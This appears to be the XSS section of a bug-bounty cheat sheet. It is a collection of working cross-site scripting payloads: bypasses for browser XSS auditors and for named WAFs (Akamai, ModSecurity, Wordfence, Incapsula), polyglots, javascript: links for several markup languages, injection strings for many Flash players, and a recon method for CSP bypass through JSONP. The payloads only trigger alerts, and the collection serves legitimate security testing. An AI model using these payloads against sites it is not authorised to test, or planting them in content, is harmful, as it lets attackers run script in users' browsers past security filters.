## XSS

**Chrome XSS-Auditor Bypass** by [@vivekchsm](https://twitter.com/vivekchsm)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

**Chrome < v60 beta XSS-Auditor Bypass**

```html
<script src="data:,alert(1)%250A-->
```

**Other Chrome XSS-Auditor Bypasses**

```html
<script>alert(1)</script
```

```html
<script>alert(1)%0d%0a-->%09</script
```

```html
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

**Safari XSS Vector** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)

```html
<script>location.href;'javascript:alert%281%29'</script>
```

**XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Kona WAF (Akamai) Bypass**

```html
\');confirm(1);//
```

**ModSecurity WAF Bypass**
Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS Bypasses**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**Incapsula WAF Bypasses** by [@i_bo0om](https://twitter.com/i_bo0om)

```html
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
```

```html
<img/src=q onerror='new Function`al\ert\`1\``'>
```

**jQuery < 3.0.0 XSS**
 by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:

1) Find any cross domain requests to untrusted domains which may inadvertently execute script.
2) Find any requests to trusted API endpoints where script can be injected into data sources.

**URL verification bypasses (works without `&#x09;` too)**

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

**Markdown XSS**

```md
[a](javascript:confirm(1))
```

```md
[a](javascript://www.google.com%0Aprompt(1))
```

```md
[a](javascript://%0d%0aconfirm(1))
```

```md
[a](javascript://%0d%0aconfirm(1);com)
```

```md
[a](javascript:window.onerror=confirm;throw%201)
```

```md
[a]: (javascript:prompt(1))
```


**Flash SWF XSS**

- ZeroClipboard: `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`

- plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`

- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)

- FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>

- videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`

- YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`

- YUI "uploader.swf": `uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`

- Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`

- AutoDemo: `control.swf?onend=javascript:alert(1)//`

- Adobe FLV Progressive: `/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//` and `/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//`

- Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`

- JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`

- SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`

- Uploadify (legacy): `uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf`

- FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`

_Note: Useful reference on constructing Flash-based XSS payloads available at [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._

**Lightweight Markup Languages**

**RubyDoc** (.rdoc)

```rdoc
XSS[JavaScript:alert(1)]
```

**Textile** ([.textile](https://txstyle.org/))

```textile
"Test link":javascript:alert(1)
```

**reStructuredText** ([.rst](http://docutils.sourceforge.net/docs/user/rst/quickref.html))

```rst
`Test link`__.

__ javascript:alert(document.domain)  
```

**Unicode characters**

```html
†‡•＜img src=a onerror=javascript:alert('test')>…‰€
```

**XSS  polyglot**
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

[AngularJS specific XSS](xss-angular.md)


**Content Security Policy (CSP) bypass via JSONP endpoints**

Grab the target's CSP:

```
curl -I http://example.com | grep 'Content-Security-Policy'
```

Either paste the CSP into https://csp-evaluator.withgoogle.com/ or just submit the target's address into the "Content Security Policy" field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.

![image](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)

Now we can use a Google dork to find some JSONP endpoints on the domains listed above.

```
site:example.com inurl:callback
```

**Bookmarklet filling up all inputs on page with value**

```js
javascript:(function()%7Bvar str='';var attack=prompt('Attack','');if(!attack)return false;function getallelems(v)%7Bvar ii=document.getElementsByTagName(v);for(var i=0;i<ii.length;i++)%7Bif(!ii%5Bi%5D.name)continue;str+=(str?'&':'')+ii%5Bi%5D.name+'='+attack;%7D%7Dgetallelems('input');getallelems('textarea');getallelems('select');str=document.location.search+(document.location.search.indexOf('?')==-1?'?':'&')+str;alert(str);document.location.search=str;%7D)();
```


**Sites**
- [</xssed> xss attack information](http://xssed.com/)
- [Reddit xss](https://www.reddit.com/r/xss/)
- [OWASP XSS cheat-sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

**Tools**
- [XSS Radar](https://github.com/bugbountyforum/XSS-Radar)
- [XSS'OR](http://xssor.io/)


**Blind XSS Frameworks (aka Out-of-band XSS)**
- [Sleepy puppy](https://github.com/Netflix/sleepy-puppy)
- [XSS Hunter](https://xsshunter.com) ([server](https://github.com/mandatoryprogrammer/xsshunter), [client](https://github.com/mandatoryprogrammer/xsshunter_client))
- [Ground Control](https://github.com/jobertabma/ground-control)
